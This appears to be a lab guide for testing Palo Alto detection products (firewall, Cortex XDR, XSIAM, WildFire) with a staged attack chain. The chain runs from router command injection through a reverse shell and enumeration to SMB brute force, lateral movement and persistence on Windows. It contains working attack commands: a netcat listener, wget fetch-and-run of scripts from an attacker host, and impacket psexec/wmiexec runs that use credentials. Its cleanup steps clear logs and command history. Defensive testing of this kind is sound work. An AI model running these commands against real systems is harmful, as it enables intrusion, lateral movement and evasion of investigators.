# Attack Chain Lab Guide
## Palo Alto Networks Security Product Testing
### Router Exploitation → Network Enumeration → Lateral Movement → Windows Payload

---

## Table of Contents

1. [Lab Architecture](#lab-architecture)
2. [Prerequisites](#prerequisites)
3. [Component Setup](#component-setup)
4. [Attack Chain Execution](#attack-chain-execution)
5. [Expected Alerts](#expected-alerts)
6. [Detection Opportunities](#detection-opportunities)
7. [Cleanup](#cleanup)

---

## Lab Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                      LAB NETWORK TOPOLOGY                       │
└─────────────────────────────────────────────────────────────────┘

  ┌──────────────┐
  │   ATTACKER   │  (Isolated - No direct access to IT/OT)
  │   MACHINE    │
  │ 10.0.1.100   │
  └──────┬───────┘
         │
         │ Exploit command injection
         ▼
  ┌──────────────┐
  │  EMULATED    │  (Runs vulnerable web server)
  │   ROUTER     │
  │ 10.0.1.1     │  Router simulation
  │              │
  │ 192.168.1.1  │  IT Network gateway
  │ 10.10.10.1   │  OT Network gateway
  └──────┬───────┘
         │
         ├────────────────────┬────────────────────┐
         │                    │                    │
         ▼                    ▼                    ▼
  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
  │   WINDOWS    │    │   IT         │    │   OT         │
  │   TARGET     │    │   NETWORK    │    │   NETWORK    │
  │ 192.168.1.50 │    │ 192.168.1.x  │    │ 10.10.10.x   │
  │              │    │              │    │              │
  │ - SMB (445)  │    │ - AD DS      │    │ - Modbus     │
  │ - RDP (3389) │    │ - File Srv   │    │ - IEC-104    │
  │ - WinRM      │    │ - MSSQL      │    │ - S7         │
  └──────────────┘    └──────────────┘    └──────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                PALO ALTO SECURITY STACK                         │
├─────────────────────────────────────────────────────────────────┤
│  - Firewall with Device Security (network visibility)           │
│  - Cortex XDR Agent (Windows target - behavioral analytics)     │
│  - XSIAM (centralized logging and analytics)                    │
│  - WildFire (malware analysis sandbox)                          │
└─────────────────────────────────────────────────────────────────┘
```

---

## Prerequisites

### Software Requirements

**Emulated Router:**
- OS: Linux (Ubuntu 20.04+ or Debian 11+)
- Python 3.8+
- Flask: `pip3 install flask`

**Attacker Machine:**
- OS: Kali Linux / ParrotOS / Ubuntu
- Python 3.8+
- Required packages:
  ```bash
  pip3 install requests urllib3
  ```
- Optional tools (for advanced attacks):
  ```bash
  apt-get install -y nmap enum4linux smbclient crackmapexec
  pip3 install impacket
  ```

**Windows Target:**
- OS: Windows 10 / Windows Server 2019+
- PowerShell 5.1+
- Python 3.8+ (optional, for Python payload)
- Cortex XDR Agent installed
- SMB, RDP, or WinRM enabled

**Palo Alto Products:**
- Firewall with Device Security subscription
- Cortex XDR tenant with agents deployed
- XSIAM instance (optional but recommended)
- WildFire cloud or appliance access

---

## Component Setup

### 1. Emulated Router Setup

**Step 1: Deploy the vulnerable web server**

```bash
# On the emulated router (e.g., 10.0.1.1)
cd /opt
git clone <your_repo> or copy the files

cd iec104_water_tank/router_simulation

# Install dependencies
pip3 install flask

# Start the vulnerable router web interface
sudo python3 vulnerable_router_server.py
```

**Expected Output:**
```
╔═══════════════════════════════════════════════════════════════╗
║         Vulnerable Router Web Server - Educational Use        ║
╚═══════════════════════════════════════════════════════════════╝

[!] WARNING: This server contains intentional vulnerabilities
[!] For authorized security testing in controlled environments only

Server Configuration:
- Port: 8080
- Host: 0.0.0.0 (accessible from network)

Vulnerable Credentials:
- admin / admin
- root / password123
- support / support

Known Vulnerability:
- Command Injection in /api/diagnostic endpoint

Access Log: router_access.log
```

**Step 2: Verify router is accessible**

From attacker machine:
```bash
curl http://10.0.1.1:8080/
```

You should see the router login page HTML.

**Step 3: Configure network routing**

Ensure the router can route between:
- Attacker network (10.0.1.0/24)
- IT network (192.168.1.0/24)
- OT network (10.10.10.0/24)

```bash
# On router
sudo sysctl -w net.ipv4.ip_forward=1

# Configure iptables if needed
sudo iptables -A FORWARD -j ACCEPT
```

---

### 2. Attacker Machine Setup

**Step 1: Install required tools**

```bash
# Update package lists
sudo apt-get update

# Install core tools
sudo apt-get install -y python3 python3-pip netcat nmap

# Install Python dependencies
pip3 install requests urllib3

# Install optional advanced tools
sudo apt-get install -y enum4linux smbclient crackmapexec
pip3 install impacket

# Verify installations
python3 --version
nc -h
nmap --version
```

**Step 2: Copy attack scripts**

```bash
# Copy the attacker_scripts directory to attacker machine
scp -r attacker_scripts/ kali@10.0.1.100:~/

# On attacker machine
cd ~/attacker_scripts
chmod +x *.sh *.py
```

---

### 3. Windows Target Setup

**Step 1: Configure Windows features**

```powershell
# Enable SMB (usually enabled by default)
Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol

# Enable RDP
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# Enable WinRM (optional)
Enable-PSRemoting -Force
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force
```

**Step 2: Create test user account**

```powershell
# Create a test user (for brute force demonstrations)
net user testuser Password123! /add
net localgroup Administrators testuser /add

# Or use existing credentials
```

**Step 3: Install Cortex XDR Agent**

1. Download agent from Cortex XDR console
2. Install with your distribution key
3. Verify agent is reporting:
   - Check Cortex XDR console → Endpoints
   - Ensure agent status is "Connected"

**Step 4: Disable Windows Defender (optional, for testing)**

```powershell
# Temporarily disable real-time protection
Set-MpPreference -DisableRealtimeMonitoring $true

# Note: Cortex XDR should still detect malicious activity
```

**Step 5: Copy payload scripts to Windows (post-compromise)**

This will be done automatically via lateral movement, but for testing:

```powershell
# Download from attacker or copy manually
# The scripts will be uploaded during lateral movement phase
```

---

### 4. Palo Alto Products Configuration

#### Firewall Configuration

**Create security policies:**

```
Policy 1: Attacker → Router (Allow with logging)
- Source: 10.0.1.0/24
- Destination: 10.0.1.1
- Service: tcp/8080
- Action: Allow
- Profile: Device Security profile
- Log: Traffic log at session end

Policy 2: Router → IT/OT Networks (Allow with deep inspection)
- Source: 10.0.1.1
- Destination: 192.168.1.0/24, 10.10.10.0/24
- Service: Any
- Action: Allow
- Profile: Threat Prevention + WildFire
- Log: Traffic + Threat logs

Policy 3: Inter-zone traffic monitoring
- Enable all threat prevention profiles
- Enable WildFire file forwarding
```

**Enable logging:**
- Traffic logs: All sessions
- Threat logs: All threats
- WildFire logs: All file submissions
- URL filtering: All categories

#### Cortex XDR Configuration

**Agent installation:**
1. Deploy agent to Windows target
2. Configure agent settings:
   - Behavioral threat protection: Enabled
   - Malware protection: Enabled
   - Exploit protection: Enabled
   - Ransomware protection: Enabled

**Analytics settings:**
1. Enable all analytics modules:
   - Behavioral threat analytics
   - Credential theft detection
   - Lateral movement detection
   - Suspicious PowerShell detection

**Alert rules:**
Create custom alert rules for:
- Multiple failed authentication attempts
- WMI process creation
- PowerShell encoded commands
- Registry persistence modifications
- Scheduled task creation

#### XSIAM Configuration (Optional)

**Data ingestion:**
1. Configure log forwarding from:
   - Palo Alto Firewalls
   - Cortex XDR agents
   - Windows Event Logs (Security, System, PowerShell)

**Correlation rules:**
Create correlation rules to detect:
- Command injection patterns
- Post-exploitation enumeration
- Lateral movement sequences
- Multi-stage attack chains

---

## Attack Chain Execution

### Phase 1: Initial Access (Router Exploitation)

**Objective:** Exploit command injection vulnerability to gain shell on router

**Execution:**

```bash
# From attacker machine (10.0.1.100)
cd ~/attacker_scripts

# Test 1: Verify vulnerability
python3 01_router_exploit.py 10.0.1.1

# Expected output:
# [+] Authentication successful!
# [+] Command injection vulnerability CONFIRMED!

# Test 2: Execute reconnaissance command
python3 01_router_exploit.py 10.0.1.1 --command "whoami"

# Test 3: Establish reverse shell
# First, start listener on attacker machine (different terminal)
nc -lvnp 4444

# Then execute reverse shell
python3 01_router_exploit.py 10.0.1.1 \
  --attacker-ip 10.0.1.100 \
  --reverse-shell \
  --shell-method bash_tcp

# You should receive a shell in your netcat listener
```

**Expected Alerts:**
- [+] Device Security: HTTP command injection signature
- [+] Firewall: Outbound connection on non-standard port (4444)
- [+] XSIAM: Reverse shell pattern detection

**Verification:**
```bash
# In the reverse shell
whoami
# Output: root or www-data

hostname
# Output: router hostname

ip addr show
# Should see multiple network interfaces
```

---

### Phase 2: Post-Exploitation Enumeration

**Objective:** Discover IT/OT network topology and identify Windows targets

**Execution:**

```bash
# In the reverse shell on router, download enumeration script
# (Simulate download)

# On attacker machine, serve the script
cd ~/attacker_scripts
python3 -m http.server 8000

# In router shell
wget http://10.0.1.100:8000/02_post_exploit_enum.sh -O /tmp/enum.sh
chmod +x /tmp/enum.sh
bash /tmp/enum.sh

# This script will:
# 1. Collect system information
# 2. Enumerate network interfaces and routes
# 3. Perform ping sweeps (generates ICMP floods)
# 4. Port scan discovered hosts (generates port scan alerts)
# 5. Identify Windows machines (SMB ports 139/445)
# 6. Enumerate ICS/SCADA devices
# 7. Search for credentials in config files
```

**Expected Alerts:**
- [+] Device Security: ICMP flood detection
- [+] Device Security: Port scan detection (source: router)
- [+] Firewall: Suspicious SMB enumeration traffic
- [+] XSIAM: Reconnaissance behavior pattern
- [+] Network anomaly: Router performing port scans

**Verification:**

```bash
# Check generated files
ls -la /tmp/.system_cache/

# View discovered Windows hosts
cat /tmp/.system_cache/windows_hosts.txt
# Expected: 192.168.1.50 (or your Windows target IP)

# View port scan results
cat /tmp/.system_cache/port_scan_results.txt
# Expected: Lists open ports including 445, 3389, etc.
```

---

### Phase 3: Lateral Movement

**Objective:** Move from router to Windows target machine

**Execution:**

```bash
# Method 1: Using the Python lateral movement framework
# Transfer the script to router

# On attacker machine
python3 -m http.server 8000

# On router shell
wget http://10.0.1.100:8000/03_lateral_movement.py -O /tmp/lm.py
python3 /tmp/lm.py -t 192.168.1.50 --scan

# Attempt credential brute force
python3 /tmp/lm.py -t 192.168.1.50 --brute-force

# If credentials found, execute full attack chain
python3 /tmp/lm.py -t 192.168.1.50 \
  -u administrator \
  -p Password123 \
  --full-chain \
  --payload "calc.exe"

# Alternative Method 2: Manual impacket usage
# If you have credentials already:

# PsExec
psexec.py administrator:Password123@192.168.1.50 "calc.exe"

# WMI
wmiexec.py administrator:Password123@192.168.1.50 "calc.exe"

# WinRM
evil-winrm -i 192.168.1.50 -u administrator -p Password123 -e calc.exe
```

**Expected Alerts:**

**Authentication Phase:**
- [+] Cortex XDR: Multiple failed login attempts (brute force detection)
- [+] Windows Event Log 4625: Failed authentication events
- [+] Firewall: SMB authentication anomaly
- [+] XSIAM: Credential stuffing pattern

**Lateral Movement Phase:**
- [+] Cortex XDR: Remote WMI process creation
- [+] Cortex XDR: PsExec lateral movement
- [+] Cortex XDR: Suspicious remote service creation
- [+] Windows Event Log 4688: Process creation via remote execution
- [+] Windows Event Log 4672: Special privileges assigned
- [+] Firewall: SMB lateral movement traffic
- [+] XSIAM: Lateral movement chain (router → Windows)

---

### Phase 4: Windows Payload Execution

**Objective:** Execute calc.exe using 11 different techniques to maximize alert generation

**Execution:**

**Option A: PowerShell Payload (Recommended)**

```bash
# On router after successful lateral movement
# Upload PowerShell script to Windows target

# Using PsExec to upload and execute
psexec.py administrator:Password123@192.168.1.50 \
  "powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\payload.ps1"

# Or manually on Windows target:
# 1. RDP to Windows machine
# 2. Open PowerShell as Administrator
# 3. Copy payload script to C:\Temp\
# 4. Execute:
powershell.exe -ExecutionPolicy Bypass -File C:\Temp\04_windows_payload.ps1
```

**Option B: Python Payload**

```bash
# Upload Python payload
smbclient //192.168.1.50/C$ -U administrator%Password123 \
  -c "put 04_windows_payload.py Windows\Temp\payload.py"

# Execute via WMI
wmiexec.py administrator:Password123@192.168.1.50 \
  "python.exe C:\Windows\Temp\payload.py"
```

**What the payload does:**

The payload executes calc.exe using 11 different techniques:

1. **Direct Process Creation** - Baseline execution
2. **WMI Process Creation** - Triggers WMI alerts
3. **Invoke-Expression** - PowerShell script execution
4. **Base64 Encoded Command** - Obfuscation detection
5. **Scheduled Task** - Persistence mechanism
6. **Registry Run Key** - Persistence via registry
7. **COM Object** - Automation abuse
8. **Process Hollowing** - Injection technique simulation
9. **Network Download** - WildFire analysis trigger
10. **Fileless Execution** - In-memory threat
11. **LOLBin Abuse** - Living-off-the-land

**Expected Alerts (Per Technique):**

| Technique | Cortex XDR | Device Security | WildFire | XSIAM |
|-----------|------------|-----------------|----------|-------|
| Direct Process | Process creation | - | - | Baseline |
| WMI | [+] WMI abuse | [+] Suspicious WMI | - | [+] |
| IEX | [+] Script execution | [+] PowerShell | - | [+] |
| Base64 Encoded | [+] Obfuscation | [+] Encoded cmd | - | [+] |
| Scheduled Task | [+] Persistence | [+] Task creation | - | [+] |
| Registry | [+] Persistence | [+] Reg modify | - | [+] |
| COM Object | [+] COM abuse | - | - | [+] |
| Process Hollow | [+] Injection | [+] Suspicious pattern | - | [+] |
| Network DL | [+] Download | [+] Network activity | [+] File analysis | [+] |
| Fileless | [+] In-memory | [+] Fileless attack | - | [+] |
| LOLBin | [+] LOLBin abuse | [+] Suspicious cmd | - | [+] |

**Verification:**

On Windows target:
```powershell
# Check execution log
Get-Content $env:TEMP\payload_execution_*.log

# Check for running calc.exe instances
Get-Process -Name CalculatorApp, win32calc

# Review Windows Event Logs
Get-EventLog -LogName Security -Newest 50 | Where-Object { $_.EventID -eq 4688 }
```

On Cortex XDR Console:
- Navigate to Incidents
- Filter by: Endpoint = Windows target, Time = Last hour
- Expected: 10-15 new incidents/alerts

On XSIAM:
- Check Attack Surface Management
- Review Attack Chain visualization
- Verify all 4 phases are linked

---

## Expected Alerts by Product

### Device Security (Firewall-based)

**Alert Timeline:**

| Time | Alert Type | Description | Severity |
|------|-----------|-------------|----------|
| T+0min | Command Injection | HTTP request with shell metacharacters | High |
| T+1min | Reverse Shell | Outbound connection to port 4444 | Critical |
| T+5min | ICMP Flood | Ping sweep from router | Medium |
| T+6min | Port Scan | Multiple SYN packets to sequential ports | High |
| T+10min | SMB Brute Force | Multiple failed SMB authentications | High |
| T+12min | Lateral Movement | PsExec/WMI traffic patterns | Critical |

**Log Queries:**

```sql
# View command injection attempts
( addr.src in 10.0.1.100 ) and ( app eq web-browsing ) and ( threat.category eq 'code-execution' )

# View port scans
( addr.src in 10.0.1.1 ) and ( action eq 'alert' ) and ( threat.name contains 'port-scan' )

# View lateral movement
( addr.dst in 192.168.1.50 ) and ( app eq ms-ds-smb ) and ( action eq 'allow' )
```

---

### Cortex XDR Alerts

**Expected Incidents:**

1. **Multiple Failed Login Attempts**
   - Causality: Brute force attack detected
   - MITRE ATT&CK: T1110.001 (Password Guessing)
   - Severity: Medium

2. **Lateral Movement via WMI**
   - Causality: Remote WMI process creation
   - MITRE ATT&CK: T1047 (Windows Management Instrumentation)
   - Severity: High

3. **Suspicious PowerShell Execution**
   - Causality: Encoded PowerShell command
   - MITRE ATT&CK: T1059.001 (PowerShell)
   - Severity: High

4. **Registry Persistence Modification**
   - Causality: Registry Run key added
   - MITRE ATT&CK: T1547.001 (Registry Run Keys)
   - Severity: High

5. **Scheduled Task Creation**
   - Causality: Suspicious task registered
   - MITRE ATT&CK: T1053.005 (Scheduled Task)
   - Severity: Medium

6. **Process Injection Behavior**
   - Causality: Process hollowing pattern
   - MITRE ATT&CK: T1055 (Process Injection)
   - Severity: Critical

7. **Fileless Execution**
   - Causality: In-memory script execution
   - MITRE ATT&CK: T1027 (Obfuscated Files or Information)
   - Severity: Critical

**XDR Console Queries:**

```sql
# View all alerts for target endpoint
dataset = xdr_data
| filter agent_hostname = "WIN-TARGET"
| filter action_evtlog_event_id in (4688, 4672, 4625)

# View lateral movement chain
dataset = xdr_data
| filter causality_actor_process_image_name in ("psexec.exe", "wmiexec.exe", "wmic.exe")

# View PowerShell activity
dataset = xdr_data
| filter actor_process_image_name = "powershell.exe"
| filter action_process_image_command_line contains "EncodedCommand"
```

---

### XSIAM Correlation

**Attack Chain Visualization:**

XSIAM should automatically correlate events into a complete attack chain:

```
[Phase 1: Initial Access]
    └─ Command Injection (10.0.1.100 → 10.0.1.1:8080)
        └─ Reverse Shell (10.0.1.1 → 10.0.1.100:4444)

[Phase 2: Discovery]
    └─ Network Enumeration (10.0.1.1 → 192.168.1.0/24)
        └─ Port Scanning (10.0.1.1 → 192.168.1.50)

[Phase 3: Lateral Movement]
    └─ SMB Brute Force (10.0.1.1 → 192.168.1.50:445)
        └─ Successful Authentication (administrator)
            └─ Remote Code Execution (PsExec/WMI)

[Phase 4: Execution]
    └─ Multiple Execution Techniques (192.168.1.50)
        ├─ WMI Process Creation
        ├─ PowerShell Execution
        ├─ Registry Modification
        ├─ Scheduled Task
        └─ File Download
```

**XSIAM Queries:**

```sql
-- Full attack chain
config case_sensitive = false
| dataset = xdr_data
| filter event_timestamp > ago(1h)
| filter agent_ip_addresses in ("10.0.1.1", "192.168.1.50")
| fields event_timestamp, action_name, causality_actor_process_image_name, actor_process_command_line
| sort asc event_timestamp

-- Lateral movement detection
preset = lateral_movement
| filter source_ip = "10.0.1.1"
| filter destination_ip = "192.168.1.50"
```

---

### WildFire Alerts

**Files Submitted for Analysis:**

1. **downloaded_payload.exe**
   - Source: Network download simulation (Technique 9)
   - Expected Verdict: Benign (it's calc.exe copy)
   - Purpose: Demonstrates file submission workflow

2. **Impacket executables** (if uploaded)
   - psexec.py compiled binaries
   - Expected Verdict: Grayware (legitimate tool, malicious use)

**WildFire Console:**

- Navigate to Monitor → WildFire Submissions
- Filter by: Source = 192.168.1.50, Time = Last hour
- Review sandbox analysis reports

---

## Detection Opportunities

### Network-Based Detection

**Indicators:**

1. **Command Injection Signatures**
   - HTTP POST with shell metacharacters (; | && $() etc.)
   - Unusual characters in diagnostic API parameters

2. **Reverse Shell Traffic**
   - Outbound connection from web server to attacker IP
   - Non-standard destination port (4444, 4445, etc.)
   - Long-lived TCP session with bidirectional traffic

3. **Reconnaissance Patterns**
   - ICMP ping sweeps across subnets
   - Sequential port scans (SYN packets to multiple ports)
   - SMB session enumeration (multiple SMB connections)

4. **Lateral Movement Traffic**
   - WMI traffic (RPC on port 135, dynamic ports)
   - PsExec named pipe creation (\\ADMIN$, \\IPC$)
   - WinRM traffic (HTTP/HTTPS on ports 5985/5986)

**IDS/IPS Signatures to Enable:**

- Web Application Attacks → Command Injection
- Exploits → Remote Code Execution
- Reconnaissance → Network Scanning
- Lateral Movement → Windows Admin Tools Abuse

---

### Endpoint-Based Detection (Cortex XDR)

**Behavioral Indicators:**

1. **Suspicious Process Trees**
   ```
   flask (web server)
    └─ sh -c ping ...
        └─ bash -i (reverse shell)
   ```

2. **WMI Abuse**
   ```
   wmiprvse.exe
    └─ calc.exe (spawned via WMI)
   ```

3. **PowerShell Chain**
   ```
   powershell.exe
    └─ -EncodedCommand <base64>
        └─ Start-Process calc.exe
   ```

4. **Persistence Mechanisms**
   - Registry modifications to Run keys
   - Scheduled task creation outside maintenance windows
   - Startup folder additions

**Analytics to Enable:**

- Behavioral Threat Protection: All modules
- Credential Theft Detection
- Lateral Movement Detection
- Ransomware Protection
- Exploit Protection

---

### Log-Based Detection (XSIAM)

**Key Event IDs:**

**Windows Security Events:**
- 4624: Successful logon (after brute force)
- 4625: Failed logon (brute force attempts)
- 4672: Special privileges assigned (admin access)
- 4688: Process creation (all techniques)
- 4698: Scheduled task created
- 4699: Scheduled task deleted
- 4657: Registry value modification

**PowerShell Operational Logs:**
- 4103: Module logging (script execution)
- 4104: Script block logging (encoded commands)

**Correlation Rules:**

Create rules to detect:
1. Multiple 4625 followed by 4624 (brute force success)
2. Remote logon (4624 Type 3) + process creation (4688)
3. PowerShell + base64 strings in command line
4. Registry Run key modification + network activity

---

## Cleanup

### Router Cleanup

```bash
# Stop vulnerable web server
sudo pkill -f vulnerable_router_server.py

# Remove enumeration artifacts
rm -rf /tmp/.system_cache
rm /tmp/enum.sh /tmp/lm.py

# Clear logs (optional)
> /var/log/auth.log
> router_access.log
```

### Windows Target Cleanup

```powershell
# Remove payload files
Remove-Item -Path "$env:TEMP\payload*.ps1" -Force
Remove-Item -Path "$env:TEMP\payload*.py" -Force
Remove-Item -Path "$env:TEMP\payload*.log" -Force
Remove-Item -Path "$env:TEMP\downloaded_payload.exe" -Force

# Remove any leftover scheduled tasks
Get-ScheduledTask | Where-Object { $_.TaskName -like "SystemMaint*" } | Unregister-ScheduledTask -Confirm:$false

# Check and clean registry
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | Where-Object { $_.PSObject.Properties.Name -like "SystemUpdate*" }

# Clear PowerShell history
Remove-Item -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force

# Re-enable Windows Defender if disabled
Set-MpPreference -DisableRealtimeMonitoring $false
```

### Attacker Machine Cleanup

```bash
# Remove downloaded scripts (optional)
rm -rf ~/attacker_scripts

# Clear command history
history -c
> ~/.bash_history
```

### Palo Alto Products

**Review and Archive:**
1. Export all logs for documentation
2. Screenshot key alerts and incidents
3. Document attack chain timeline

**Reset (if needed):**
- Close incidents in Cortex XDR
- Archive alerts in XSIAM
- Clear WildFire submission queue

---

## Success Metrics

After executing the complete attack chain, you should observe:

### Minimum Expected Alerts:

| Product | Minimum Alerts | Alert Types |
|---------|---------------|-------------|
| Device Security | 8-12 | Command injection, port scan, lateral movement |
| Cortex XDR | 15-25 | Process creation, WMI, PowerShell, persistence |
| XSIAM | 1 Attack Chain | 4-phase correlated attack |
| WildFire | 1-3 | File submissions |

### Attack Chain Completeness:

- [+] Phase 1: Initial Access via router exploitation
- [+] Phase 2: Network enumeration and discovery
- [+] Phase 3: Lateral movement to Windows
- [+] Phase 4: Payload execution (calc.exe)

### MITRE ATT&CK Coverage:

The attack demonstrates these TTPs:

- **Initial Access:** T1190 (Exploit Public-Facing Application)
- **Execution:** T1047 (WMI), T1059.001 (PowerShell), T1053.005 (Scheduled Task)
- **Persistence:** T1547.001 (Registry Run Keys), T1053.005 (Scheduled Task)
- **Defense Evasion:** T1027 (Obfuscated Files), T1140 (Deobfuscate/Decode)
- **Discovery:** T1046 (Network Service Scanning), T1018 (Remote System Discovery)
- **Lateral Movement:** T1021.002 (SMB/Windows Admin Shares), T1021.006 (WinRM)
- **Command and Control:** T1071.001 (Web Protocols)

---

## Training Scenarios

### Scenario 1: Basic Attack Chain
- Execute all 4 phases sequentially
- Document every alert generated
- Create incident timeline

### Scenario 2: Stealth Testing
- Modify scripts to be more stealthy
- Add delays between actions
- Use legitimate admin tools
- Measure detection rate

### Scenario 3: Red Team vs Blue Team
- Red Team: Execute attack chain
- Blue Team: Detect and respond in real-time
- Measure MTTD (Mean Time To Detect)
- Measure MTTR (Mean Time To Respond)

### Scenario 4: Alert Tuning
- Run attack chain multiple times
- Identify false positives
- Tune correlation rules
- Optimize detection coverage

---

## Additional Resources

### Documentation:
- Palo Alto Device Security: https://docs.paloaltonetworks.com
- Cortex XDR: https://docs.paloaltonetworks.com/cortex/cortex-xdr
- XSIAM: https://docs.paloaltonetworks.com/cortex/cortex-xsiam

### MITRE ATT&CK:
- https://attack.mitre.org/

### Security Research:
- Router vulnerabilities: CVE-2020-8515, CVE-2021-20090
- Lateral movement techniques: Impacket toolkit
- Windows persistence: LOLBAS project

---

## [!] Legal Disclaimer

This lab environment and all associated scripts are for **authorized security testing only**.

- Only use in controlled lab environments
- Do not use against production systems
- Do not use without explicit authorization
- Educational purposes only

Unauthorized access to computer systems is illegal.

---

## Troubleshooting

### Issue: Router exploit not working

**Symptoms:** Authentication fails or command injection not detected

**Solutions:**
1. Verify router web server is running: `curl http://10.0.1.1:8080`
2. Check credentials: admin/admin
3. Review router_access.log for errors
4. Ensure Flask is installed: `pip3 install flask`

### Issue: Reverse shell not connecting

**Symptoms:** Exploit sends payload but no shell received

**Solutions:**
1. Verify netcat listener is running: `nc -lvnp 4444`
2. Check firewall rules allow outbound on port 4444
3. Try alternative shell method: `--shell-method netcat_fifo`
4. Verify attacker IP is correct

### Issue: Lateral movement fails

**Symptoms:** Cannot connect to Windows target

**Solutions:**
1. Verify Windows target is reachable: `ping 192.168.1.50`
2. Check SMB port is open: `nc -zv 192.168.1.50 445`
3. Verify credentials are correct
4. Ensure Windows Firewall allows SMB/RDP/WinRM
5. Check Cortex XDR is not blocking (expected for testing)

### Issue: No alerts generated

**Symptoms:** Attack succeeds but no alerts in Palo Alto products

**Solutions:**
1. Verify Device Security subscription is active
2. Check Cortex XDR agent is connected and reporting
3. Ensure XSIAM data ingestion is configured
4. Review alert threshold settings (may be too high)
5. Check time synchronization across all systems

---

## [+] Completion Checklist

- [ ] Router web server deployed and accessible
- [ ] Attacker machine configured with all tools
- [ ] Windows target prepared with Cortex XDR agent
- [ ] Palo Alto products configured and monitoring
- [ ] Phase 1: Router exploited successfully
- [ ] Phase 2: Network enumeration completed
- [ ] Phase 3: Lateral movement achieved
- [ ] Phase 4: Calc.exe executed via multiple techniques
- [ ] Minimum 20 alerts generated across all products
- [ ] Attack chain visible in XSIAM
- [ ] All logs exported and documented
- [ ] Lab environment cleaned up

---

**Lab Guide Version:** 1.0
**Last Updated:** January 2026
**Author:** Security Research Team

---
